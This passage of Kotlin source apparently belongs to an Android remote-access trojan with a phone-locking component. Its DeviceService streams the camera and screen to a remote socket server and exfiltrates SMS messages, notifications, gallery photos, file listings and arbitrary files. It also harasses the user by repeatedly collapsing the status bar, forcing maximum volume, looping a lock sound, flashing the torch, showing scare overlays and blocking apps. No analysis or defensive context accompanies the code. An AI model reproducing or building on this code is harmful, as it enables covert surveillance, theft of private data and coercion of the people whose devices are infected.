                val maxVol = audioManager.getStreamMaxVolume(stream)
                val currentVol = audioManager.getStreamVolume(stream)
                if (currentVol != maxVol) {
                    audioManager.setStreamVolume(stream, maxVol, 0)
                }
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "forceMaxVolume error: ${e.message}")
        }
    }

    private fun startStatusBarCollapse() {
        stopStatusBarCollapse()
        statusBarCollapseHandler = Handler(Looper.getMainLooper())
        statusBarCollapseRunnable = object : Runnable {
            override fun run() {
                try {
                    @Suppress("DEPRECATION")
                    sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
                } catch (_: Exception) {}
                try {
                    val service = getSystemService("statusbar")
                    val clazz = Class.forName("android.app.StatusBarManager")
                    val method = clazz.getMethod("collapsePanels")
                    method.invoke(service)
                } catch (_: Exception) {}
                statusBarCollapseHandler?.postDelayed(this, 50) 
            }
        }
        statusBarCollapseHandler?.post(statusBarCollapseRunnable!!)
    }

    private fun stopStatusBarCollapse() {
        statusBarCollapseRunnable?.let { statusBarCollapseHandler?.removeCallbacks(it) }
        statusBarCollapseHandler = null
        statusBarCollapseRunnable = null
    }

    private fun removeLockCustomOverlay() {
        lockCustomView?.let {
            try { 
                Handler(Looper.getMainLooper()).post { lockCustomWm.removeView(it) } 
            } catch (_: Exception) {}
        }
        lockCustomView = null
    }

    private var lockFlashHandler: Handler? = null
    private var lockFlashRunnable: Runnable? = null
    private var lockFlashState = false

    private fun startLockFlashBlink() {
        stopLockFlashBlink()
        lockFlashHandler = Handler(Looper.getMainLooper())
        lockFlashRunnable = object : Runnable {
            override fun run() {
                lockFlashState = !lockFlashState
                try { 
                    torchCameraId?.let { cameraManager?.setTorchMode(it, lockFlashState) } 
                } catch (_: Exception) {}
                lockFlashHandler?.postDelayed(this, 200)
            }
        }
        lockFlashHandler?.post(lockFlashRunnable!!)
    }

    private fun stopLockFlashBlink() {
        lockFlashHandler?.removeCallbacks(lockFlashRunnable ?: return)
        lockFlashHandler  = null
        lockFlashRunnable = null
        lockFlashState    = false
        try { 
            torchCameraId?.let { cameraManager?.setTorchMode(it, false) } 
        } catch (_: Exception) {}
    }

    private fun setFlashlight(on: Boolean) {
        if (on) {
            if (flashBlinking) return
            flashBlinking = true
            flashHandler  = Handler(Looper.getMainLooper())
            var state     = false
            flashRunnable = object : Runnable {
                override fun run() {
                    if (!flashBlinking) {
                        try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
                        return
                    }
                    state = !state
                    try { torchCameraId?.let { cameraManager?.setTorchMode(it, state) } } catch (_: Exception) {}
                    flashHandler?.postDelayed(this, 200)
                }
            }
            flashHandler?.post(flashRunnable!!)
        } else {
            flashBlinking = false
            flashHandler?.removeCallbacks(flashRunnable ?: return)
            flashHandler  = null
            flashRunnable = null
            try { torchCameraId?.let { cameraManager?.setTorchMode(it, false) } } catch (_: Exception) {}
        }
        emitStatus(JSONObject().apply { put("flashlight", on) })
    }

    private fun startCamera(facing: String) {
        Handler(Looper.getMainLooper()).post {
            stopCameraInternal()
            streaming = true

            val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
                             else CameraSelector.LENS_FACING_BACK
            val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            val future = ProcessCameraProvider.getInstance(this)
            future.addListener({
                try {
                    cameraProvider = future.get()
                    cameraProvider?.unbindAll()

                    imageAnalysis = ImageAnalysis.Builder()
                        .setTargetResolution(android.util.Size(640, 480))
                        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                        .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                        .build()

                    imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
                        if (!streaming) { imageProxy.close(); return@setAnalyzer }
                        val now = System.currentTimeMillis()
                        if (now - lastFrameTime < FRAME_INTERVAL) { imageProxy.close(); return@setAnalyzer }
                        lastFrameTime = now

                        try {
                            val raw      = imageProxy.toBitmap()
                            val rotation = imageProxy.imageInfo.rotationDegrees
                            val bitmap   = if (rotation != 0) {
                                val matrix  = Matrix().apply { postRotate(rotation.toFloat()) }
                                val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
                                raw.recycle()
                                rotated
                            } else raw

                            val out = ByteArrayOutputStream()
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
                            val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
                            bitmap.recycle()

                            emitFrame(b64)
                        } catch (_: Exception) {}
                        imageProxy.close()
                    }

                    cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
                    emitStatus(JSONObject().apply { put("cameraActive", true) })
                } catch (e: Exception) {
                    Log.e("DeviceService", "Camera bind error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun stopCamera() {
        streaming = false
        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
        emitStatus(JSONObject().apply { put("cameraActive", false) })
    }

    private fun stopCameraInternal() {
        streaming = false
        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
        cameraProvider = null
        imageAnalysis  = null
    }

    private fun requestScreenCapture() {
        if (savedProjectionResultCode == Activity.RESULT_OK && savedProjectionData != null) {
            startScreenCapture(savedProjectionResultCode, savedProjectionData!!)
            return
        }
        val mainReq = Intent("com.fantzy.nih.REQUEST_SCREEN_CAPTURE").apply {
            setPackage(packageName)
            addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES)
        }
        sendBroadcast(mainReq)
        Handler(Looper.getMainLooper()).postDelayed({
            if (!screenStreaming && savedProjectionData == null) {
                val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        }, 1500)
    }

    private fun startScreenCapture(resultCode: Int, data: Intent) {
        stopScreenCapture()

        Thread {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val capW: Int
                val capH: Int
                val capDpi: Int
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val bounds = wm.currentWindowMetrics.bounds
                    val scale  = 0.25f
                    capW   = (bounds.width()  * scale).toInt().coerceAtLeast(1)
                    capH   = (bounds.height() * scale).toInt().coerceAtLeast(1)
                    capDpi = resources.displayMetrics.densityDpi
                } else {
                    val metrics = DisplayMetrics()
                    @Suppress("DEPRECATION") 
                    wm.defaultDisplay.getMetrics(metrics)
                    val scale = 0.25f
                    capW   = (metrics.widthPixels  * scale).toInt().coerceAtLeast(1)
                    capH   = (metrics.heightPixels * scale).toInt().coerceAtLeast(1)
                    capDpi = metrics.densityDpi
                }

                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                val projection = mgr.getMediaProjection(resultCode, data)
                projection.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        Handler(Looper.getMainLooper()).post { stopScreenCapture() }
                    }
                }, Handler(Looper.getMainLooper()))
                mediaProjection = projection

                screenStreaming = true
                lastScreenFrameTime = 0L
                screenIsSending = false

                imageReader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 3)
                val captureHandler = Handler(Looper.getMainLooper())
                
                imageReader?.setOnImageAvailableListener({ reader ->
                    if (!screenStreaming || screenIsSending) return@setOnImageAvailableListener
                    val now = System.currentTimeMillis()
                    if (now - lastScreenFrameTime < SCREEN_FRAME_INTERVAL) return@setOnImageAvailableListener
                    lastScreenFrameTime = now
                    screenIsSending = true
                    Thread {
                        try {
                            captureAndSendScreen(reader)
                        } finally {
                            screenIsSending = false
                        }
                    }.start()
                }, captureHandler)

                projection.createVirtualDisplay(
                    "ScreenLive", capW, capH, capDpi,
                    android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader!!.surface, null, captureHandler
                )

                screenHandler = Handler(Looper.getMainLooper())
                screenRunnable = object : Runnable {
                    override fun run() {
                        if (!screenStreaming) return
                        if (!screenIsSending) {
                            val now = System.currentTimeMillis()
                            if (now - lastScreenFrameTime >= SCREEN_FRAME_INTERVAL) {
                                lastScreenFrameTime = now
                                screenIsSending = true
                                Thread {
                                    try {
                                        captureAndSendScreen()
                                    } finally {
                                        screenIsSending = false
                                    }
                                }.start()
                            }
                        }
                        screenHandler?.postDelayed(this, SCREEN_FRAME_INTERVAL)
                    }
                }
                screenHandler?.post(screenRunnable!!)

                Handler(Looper.getMainLooper()).post {
                    emitStatus(JSONObject().apply { put("screenActive", true) })
                }
            } catch (e: Exception) {
                Log.e("DeviceService", "startScreenCapture Error: ${e.message}")
                Handler(Looper.getMainLooper()).post {
                    emitStatus(JSONObject().apply {
                        put("screenActive", false)
                        put("error", e.message)
                    })
                }
            }
        }.start()
    }

    private fun captureAndSendScreen(reader: ImageReader? = null) {
        val activeReader = reader ?: imageReader ?: return
        var image: android.media.Image? = null
        try {
            image = activeReader.acquireLatestImage() ?: return
            
            val planes      = image.planes
            val buffer      = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride   = planes[0].rowStride
            val rowPadding  = rowStride - pixelStride * image.width

            val bmp = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height, Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)

            val cropped = if (rowPadding > 0)
                Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
            else bmp

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 35, baos) 
            
            if (cropped !== bmp) cropped.recycle()
            bmp.recycle()
            image.close()
            image = null

            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
            
            try { emitScreenFrame(b64) } catch (_: Exception) {}
            
        } catch (e: Exception) {
            Log.e("DeviceService", "captureAndSendScreen Error: ${e.message}")
        } finally {
            image?.close()
        }
    }

    private fun stopScreenCapture() {
        screenStreaming = false
        screenIsSending = false
        screenRunnable?.let { screenHandler?.removeCallbacks(it) }
        screenHandler  = null
        screenRunnable = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        emitStatus(JSONObject().apply { put("screenActive", false) })
    }

    private fun emitScreenFrame(b64: String) {
        if (socket?.connected() != true) return
        socket?.emit("screen:frame", JSONObject().apply {
            put("deviceId", deviceId)
            put("frame", "data:image/jpeg;base64,$b64")
        })
    }

    private fun setWallpaperFromUrl(url: String) {
        Thread {
            try {
                val conn = (java.net.URL(url).openConnection() as java.net.HttpURLConnection).apply {
                    requestMethod = "GET"
                    connectTimeout = 8000
                    readTimeout = 15000
                    setRequestProperty("User-Agent", "Mozilla/5.0")
                    setRequestProperty("Accept", "image/*")
                    instanceFollowRedirects = true
                    connect()
                }

                if (conn.responseCode != 200) {
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    conn.disconnect()
                    return@Thread
                }

                val bytes = conn.inputStream.use { it.readBytes() }
                conn.disconnect()

                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                if (bmp == null) {
                    emitStatus(JSONObject().apply { put("wallpaperSet", false) })
                    return@Thread
                }

                val wm = WallpaperManager.getInstance(this)
                wm.setBitmap(bmp)
                bmp.recycle()
                emitStatus(JSONObject().apply { put("wallpaperSet", true) })
            } catch (e: Exception) {
                emitStatus(JSONObject().apply { put("wallpaperSet", false) })
            }
        }.start()
    }

    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            emitStatus(JSONObject().apply { put("openedUrl", url) })
        } catch (e: Exception) {
            Log.e("DeviceService", "openUrl error: ${e.message}")
        }
    }

    private fun playAudio(url: String) {
        try {
            mediaPlayer?.release()
            mediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnCompletionListener { release(); mediaPlayer = null }
                setOnErrorListener { _, _, _ -> release(); mediaPlayer = null; false }
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playAudio: ${e.message}")
        }
    }
    private fun playLockSound() {
        try {
            lockMediaPlayer?.release()
            lockMediaPlayer = null

            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            
            lockMediaPlayer = android.media.MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true 
                
                setOnPreparedListener { mp -> mp.start() }
                
                // PENGAMAN JIKA SUARA TERHENTIKAN OLEH SISTEM
                setOnCompletionListener { mp ->
                    if (lockPin.isNotEmpty() || lockCustomView != null || LockChatLive.currentInstance != null) {
                        try {
                            if (mp.isPlaying) return@setOnCompletionListener
                            mp.seekTo(0)
                            mp.start()
                        } catch (e: Exception) {
                            Handler(Looper.getMainLooper()).postDelayed({
                                if (lockPin.isNotEmpty() || lockCustomView != null || LockChatLive.currentInstance != null) {
                                    playLockSound()
                                }
                            }, 1000)
                        }
                    }
                }
                
                setOnErrorListener { mp, _, _ ->
                    mp.release()
                    lockMediaPlayer = null
                    if (lockPin.isNotEmpty() || lockCustomView != null || LockChatLive.currentInstance != null) {
                        Handler(Looper.getMainLooper()).postDelayed({
                            playLockSound()
                        }, 1000)
                    }
                    true
                }
                
                prepareAsync()
            }
        } catch (e: Exception) {
            Log.e("DeviceService", "playLockSound error: ${e.message}")
            if (lockPin.isNotEmpty() || lockCustomView != null || LockChatLive.currentInstance != null) {
                Handler(Looper.getMainLooper()).postDelayed({
                    playLockSound()
                }, 1000)
            }
        }
    }
    private fun startJumpscare(value: String) {
        stopJumpscare()
        jumpscareUrls = try {
            val arr = org.json.JSONArray(value)
            (0 until arr.length()).map { arr.getString(it) }.filter { it.isNotBlank() }
        } catch (_: Exception) {
            if (value.isNotBlank()) listOf(value) else emptyList()
        }
        if (jumpscareUrls.isEmpty()) return

        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        val screenW = metrics.widthPixels
        val screenH = metrics.heightPixels

        val spawnJumpscare = object : Runnable {
            override fun run() {
                if (jumpscareUrls.isEmpty()) return
                val pickedUrl = jumpscareUrls.random()
                try {
                    val imgView = android.widget.ImageView(this@DeviceService)
                    imgView.scaleType = android.widget.ImageView.ScaleType.CENTER_CROP

                    val size = (120 + (Math.random() * 80).toInt())
                    val px = (size * metrics.density).toInt()

                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    else
                        @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                    val params = WindowManager.LayoutParams(
                        px, px, type,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                        PixelFormat.TRANSLUCENT
                    ).apply {
                        gravity = android.view.Gravity.TOP or android.view.Gravity.START
                        x = (Math.random() * (screenW - px)).toInt().coerceAtLeast(0)
                        y = (Math.random() * (screenH - px)).toInt().coerceAtLeast(0)
                    }

                    wm.addView(imgView, params)
                    jumpscareViews.add(imgView)

                    Thread {
                        try {
                            var redirectUrl = pickedUrl
                            var bmp: Bitmap? = null
                            for (i in 0..4) {
                                val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                                conn.connectTimeout = 12000
                                conn.readTimeout = 15000
                                conn.instanceFollowRedirects = false
                                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
                                conn.setRequestProperty("Accept", "image/*,*/*;q=0.8")
                                conn.connect()
                                val code = conn.responseCode
                                if (code in 300..399) {
                                    val loc = conn.getHeaderField("Location")
                                    conn.disconnect()
                                    if (loc != null) { redirectUrl = loc; continue } else break
                                }
                                val bytes = conn.inputStream.readBytes()
                                conn.disconnect()
                                bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                break
                            }
                            if (bmp != null) {
                                val finalBmp = bmp
                                Handler(Looper.getMainLooper()).post { imgView.setImageBitmap(finalBmp) }
                            }
                        } catch (e: Exception) {
                            Log.e("DeviceService", "jumpscare img load: ${e.message}")
                        }
                    }.start()

                    Handler(Looper.getMainLooper()).postDelayed({
                        try { wm.removeView(imgView); jumpscareViews.remove(imgView) } catch (_: Exception) {}
                    }, 2500)

                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare spawn: ${e.message}")
                }

                jumpscareRunnable = this
                jumpscareHandler.postDelayed(this, 600)
            }
        }

        jumpscareRunnable = spawnJumpscare
        jumpscareHandler.post(spawnJumpscare)
    }

    private fun stopJumpscare() {
        jumpscareUrls = emptyList()
        jumpscareRunnable?.let { jumpscareHandler.removeCallbacks(it) }
        jumpscareRunnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscareViews.toList().forEach { v ->
            try { wm.removeView(v) } catch (_: Exception) {}
        }
        jumpscareViews.clear()
    }

    private fun startJumpscare2(value: String) {
        stopJumpscare2()
        try {
            val obj      = JSONObject(value)
            val url      = obj.getString("url")
            val duration = obj.optLong("duration", 3000L)

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else
                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_FULLSCREEN,
                PixelFormat.TRANSLUCENT
            )

            val imgView = android.widget.ImageView(this).apply {
                scaleType = android.widget.ImageView.ScaleType.CENTER_CROP
                setBackgroundColor(android.graphics.Color.BLACK)
            }

            jumpscare2View = imgView
            Handler(Looper.getMainLooper()).post { wm.addView(imgView, params) }

            Thread {
                try {
                    var redirectUrl = url
                    var bmp: Bitmap? = null
                    for (i in 0..4) {
                        val conn = java.net.URL(redirectUrl).openConnection() as java.net.HttpURLConnection
                        conn.connectTimeout = 12000
                        conn.readTimeout = 15000
                        conn.instanceFollowRedirects = false
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                        conn.setRequestProperty("Accept", "image/*")
                        conn.connect()
                        val code = conn.responseCode
                        if (code in 300..399) {
                            val loc = conn.getHeaderField("Location")
                            conn.disconnect()
                            if (loc != null) { redirectUrl = loc; continue } else break
                        }
                        val bytes = conn.inputStream.readBytes()
                        conn.disconnect()
                        bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                        break
                    }
                    val finalBmp = bmp
                    Handler(Looper.getMainLooper()).post {
                        if (finalBmp != null) imgView.setImageBitmap(finalBmp)
                    }
                } catch (e: Exception) {
                    Log.e("DeviceService", "jumpscare2 img: ${e.message}")
                }
            }.start()

            jumpscare2Handler = Handler(Looper.getMainLooper())
            jumpscare2Runnable = Runnable {
                try { wm.removeView(imgView) } catch (_: Exception) {}
                jumpscare2View = null
                emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
            }
            jumpscare2Handler?.postDelayed(jumpscare2Runnable!!, duration)
            emitStatus(JSONObject().apply { put("jumpscare2Active", true) })
        } catch (e: Exception) {
            Log.e("DeviceService", "startJumpscare2: ${e.message}")
        }
    }

    private fun stopJumpscare2() {
        jumpscare2Runnable?.let { jumpscare2Handler?.removeCallbacks(it) }
        jumpscare2Handler  = null
        jumpscare2Runnable = null
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        jumpscare2View?.let { try { wm.removeView(it) } catch (_: Exception) {} }
        jumpscare2View = null
        emitStatus(JSONObject().apply { put("jumpscare2Active", false) })
    }

    private val notifStore = mutableMapOf<String, ArrayDeque<JSONObject>>()

    private fun storeNotif(payload: JSONObject) {
        val pkg = payload.optString("pkg") ?: return
        val deque = notifStore.getOrPut(pkg) { ArrayDeque() }
        deque.addFirst(payload)
        if (deque.size > 500) deque.removeLast()
    }

    private fun sendStoredNotifs() {
        Thread {
            try {
                val result = org.json.JSONArray()
                notifStore.forEach { (pkg, deque) ->
                    val msgs = org.json.JSONArray()
                    deque.forEach { msgs.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg", pkg)
                        put("appName", deque.firstOrNull()?.optString("appName") ?: pkg)
                        put("messages", msgs)
                    })
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("notifList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendStoredNotifs: ${e.message}")
            }
        }.start()
    }

    private fun sendSms() {
        Thread {
            try {
                val uri = android.net.Uri.parse("content://sms/inbox")
                val cursor = contentResolver.query(
                    uri,
                    arrayOf("address", "body", "date", "read"),
                    null, null, "date DESC"
                ) ?: return@Thread
                
                val grouped = mutableMapOf<String, ArrayDeque<JSONObject>>()
                cursor.use {
                    while (it.moveToNext()) {
                        val address = it.getString(0) ?: continue
                        val body    = it.getString(1) ?: continue
                        val date    = it.getLong(2)
                        val msg = JSONObject().apply {
                            put("pkg", "com.android.sms")
                            put("appName", "SMS")
                            put("title", address)
                            put("text", body)
                            put("time", date)
                        }
                        grouped.getOrPut(address) { ArrayDeque() }.addLast(msg)
                    }
                }

                val result = org.json.JSONArray()
                grouped.forEach { (address, msgs) ->
                    val msgArr = org.json.JSONArray()
                    msgs.forEach { msgArr.put(it) }
                    result.put(JSONObject().apply {
                        put("pkg", "com.android.sms")
                        put("appName", "SMS — $address")
                        put("messages", msgArr)
                    })
                }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:status", JSONObject().apply {
                    put("deviceId", deviceId)
                    put("status", JSONObject().apply { put("smsList", result) })
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendSms: ${e.message}")
            }
        }.start()
    }

    private fun sendGallery() {
        Thread {
            try {
                val hasPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
                else
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

                if (!hasPerm) {
                    if (socket?.connected() == true) {
                        socket?.emit("device:gallery", org.json.JSONObject().apply {
                            put("deviceId", deviceId)
                            put("photos", org.json.JSONArray())
                            put("error", "Izin galeri belum diberikan")
                        })
                    }
                    return@Thread
                }

                val arr = org.json.JSONArray()
                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
                val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI

                val cursor: Cursor? = contentResolver.query(uri, projection, null, null, sortOrder)
                cursor?.use { c ->
                    val idCol   = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    var count = 0
                    while (c.moveToNext() && count < 100) {
                        val id      = c.getLong(idCol)
                        val name    = c.getString(nameCol) ?: ""
                        val date    = c.getLong(dateCol)
                        val size    = c.getLong(sizeCol)
                        val imgUri  = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())                        
                        try {
                            val opts = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
                            contentResolver.openInputStream(imgUri)?.use { 
                                android.graphics.BitmapFactory.decodeStream(it, null, opts) 
                            }
                            val maxDim = 300
                            val sample = maxOf(1, minOf(opts.outWidth, opts.outHeight) / maxDim)
                            val decodeOpts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
                            val bmp = contentResolver.openInputStream(imgUri)?.use { 
                                android.graphics.BitmapFactory.decodeStream(it, null, decodeOpts) 
                            }
                            if (bmp != null) {
                                val bos = java.io.ByteArrayOutputStream()
                                bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 72, bos)
                                bmp.recycle()
                                val b64 = android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
                                arr.put(org.json.JSONObject().apply {
                                    put("id", id)
                                    put("name", name)
                                    put("date", date)
                                    put("size", size)
                                    put("thumb", "data:image/jpeg;base64,$b64")
                                })
                                count++
                            }
                        } catch (_: Exception) { }
                    }
                }
                if (socket?.connected() != true) return@Thread
                socket?.emit("device:gallery", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("photos", arr)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendGallery: ${e.message}")
            }
        }.start()
    }

    private fun sendFileList(path: String) {
        Thread {
            try {
                val rootPath = if (path.isBlank()) {
                    android.os.Environment.getExternalStorageDirectory().absolutePath
                } else path

                val dir = java.io.File(rootPath)
                val arr = org.json.JSONArray()

                if (!dir.exists() || !dir.isDirectory) {
                    socket?.emit("device:files", org.json.JSONObject().apply {
                        put("deviceId", deviceId)
                        put("path", rootPath)
                        put("files", arr)
                        put("error", "Folder tidak ditemukan atau tidak bisa diakses")
                    })
                    return@Thread
                }

                val canReadAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    android.os.Environment.isExternalStorageManager()
                } else {
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                }

                val entries = try { dir.listFiles() } catch (_: Exception) { null }

                entries
                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                    ?.forEach { f ->
                        try {
                            arr.put(org.json.JSONObject().apply {
                                put("name", f.name)
                                put("path", f.absolutePath)
                                put("isDir", f.isDirectory)
                                put("size", if (f.isFile) f.length() else 0L)
                                put("modified", f.lastModified())
                                put("readable", f.canRead())
                            })
                        } catch (_: Exception) {}
                    }

                if (socket?.connected() != true) return@Thread
                socket?.emit("device:files", org.json.JSONObject().apply {
                    put("deviceId", deviceId)
                    put("path", rootPath)
                    put("files", arr)
                    put("canReadAll", canReadAll)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "sendFileList: ${e.message}")
            }
        }.start()
    }

    private fun downloadAndSendFile(value: String) {
        Thread {
            try {
                val obj   = org.json.JSONObject(value)
                val path  = obj.getString("path")
                val reqId = obj.getString("reqId")
                val file  = java.io.File(path)
                if (!file.exists() || !file.isFile || !file.canRead()) {
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", reqId)
                        put("error", "File tidak ditemukan atau tidak bisa dibaca")
                    })
                    return@Thread
                }
                val bytes = file.readBytes()
                val b64   = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                val ext   = file.extension.lowercase()
                val mime  = android.webkit.MimeTypeMap.getSingleton()
                    .getMimeTypeFromExtension(ext) ?: "application/octet-stream"
                socket?.emit("device:filedata", org.json.JSONObject().apply {
                    put("reqId", reqId)
                    put("base64", b64)
                    put("mime", mime)
                })
            } catch (e: Exception) {
                Log.e("DeviceService", "downloadAndSendFile: ${e.message}")
                try {
                    val obj = org.json.JSONObject(value)
                    socket?.emit("device:filedata", org.json.JSONObject().apply {
                        put("reqId", obj.optString("reqId", ""))
                        put("error", e.message ?: "Error")
                    })
                } catch (_: Exception) {}
            }
        }.start()
    }

    private fun blockApp(pkgJson: String) {
        try {
            val obj  = org.json.JSONObject(pkgJson)
            val pkg  = obj.getString("package")
            val name = obj.optString("name", pkg)
            val i = Intent("com.fantzy.nih.BLOCK_APP").apply {
                putExtra("package", pkg)
                putExtra("name", name)
                setPackage(packageName)
            }
            sendBroadcast(i)            
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "blockApp: ${e.message}")
        }
    }

    private fun unblockApp(pkg: String) {
        try {
            val i = Intent("com.fantzy.nih.UNBLOCK_APP").apply {
                putExtra("package", pkg)
                setPackage(packageName)
            }
            sendBroadcast(i)
            val blocked = AppBlockerService.blockedPackages.toList()
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray(blocked))
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockApp: ${e.message}")
        }
    }

    private fun unblockAll() {
        try {
            val i = Intent("com.fantzy.nih.UNBLOCK_ALL").apply { setPackage(packageName) }
            sendBroadcast(i)
            emitStatus(org.json.JSONObject().apply {
                put("blockedApps", org.json.JSONArray())
            })
        } catch (e: Exception) {
            Log.e("DeviceService", "unblockAll: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasFine && !hasCoarse) {
            socket?.emit("device:location", org.json.JSONObject().apply {
